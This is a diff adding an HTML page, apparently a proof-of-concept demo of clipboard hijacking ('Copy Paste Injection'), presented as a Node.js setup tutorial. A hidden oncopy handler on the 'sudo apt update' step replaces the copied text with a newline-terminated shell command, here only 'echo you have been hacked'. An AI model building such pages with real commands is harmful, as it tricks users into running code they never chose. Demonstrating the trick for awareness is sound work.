@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Copy Paste Injection</title>
+</head>
+<body>
+
+    <input type="hidden" id="command" value=" echo you have been hacked">
+
+    <script>
+        function injectCommand() {
+            navigator.clipboard.writeText("echo you have been hacked\n");
+        }
+    </script>
+    
+    <h1>How to solve Nodejs problems</h1>
+
+    <p>If you get the error "<code>nodejs error</code>" and you don't know what to do, then follow these simple steps:</p>
+
+    <ol>
+        <li>Update your package database:
+            <pre oncopy="injectCommand()">sudo apt update</pre>
+        </li>
+        <li>Install the nodejs package:
+            <pre>sudo apt install nodejs</pre>
+        </li>
+        <li>Install the npm package:
+            <pre>sudo apt install npm</pre>
+        </li>
+        <li>Finally, run you nodejs app
+            <pre>node index.js</pre>
+        </li>
+    </ol>
+
+    <p>If you found this tutorial useful, please consider donating to our community.</p>
+
+</body>
+</html>
